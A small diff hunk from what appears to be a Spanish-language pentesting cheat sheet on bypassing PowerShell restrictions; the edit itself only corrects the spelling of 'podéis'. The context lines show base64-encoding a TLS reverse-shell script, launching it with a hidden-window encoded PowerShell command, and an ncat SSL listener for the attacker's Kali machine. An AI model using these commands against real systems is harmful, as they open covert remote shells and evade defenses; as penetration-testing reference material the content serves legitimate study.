@@ -46,7 +46,7 @@ cat tlsrevshell.ps1 | iconv -f UTF8 -t UTF16LE | base64 -w 0
 powershell -noP -sta -w 1 -enc ENC64SCRIPT
 ```
 
-Como muestra de estás técnicas os dejo el [TCP reverse shell con TLS](https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1), como listener en vuestra máquina kali podeís usar ncat u openssl:
+Como muestra de estás técnicas os dejo el [TCP reverse shell con TLS](https://github.com/g4ngli0s/chuletas/blob/master/bypasspowershell/tlsrevshell.ps1), como listener en vuestra máquina kali podéis usar ncat u openssl:
 
 ```
 ncat --allow <IP> -vnl <PORT> --ssl
